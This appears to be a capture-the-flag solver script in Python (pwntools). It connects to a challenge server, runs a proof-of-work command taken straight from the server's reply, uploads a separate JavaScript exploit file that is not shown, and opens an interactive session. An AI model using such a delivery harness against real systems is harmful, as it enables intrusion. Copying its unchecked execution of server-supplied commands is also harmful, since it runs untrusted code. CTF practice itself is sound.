#!/usr/bin/env python
from pwn import *
import subprocess

#context.log_level = 'debug'
r = remote('chromatic-aberration.zajebistyc.tf', 31004)

exp = open('./exp.js').read()
size = len(exp)

hashcash = r.recvuntil('Solution:').split('\n')[0].split(' ')
process = subprocess.Popen(hashcash, stdout=subprocess.PIPE)
token = process.communicate()[0]

r.send(token)
r.sendlineafter('file\n', str(size))
r.sendline(exp)

r.interactive()
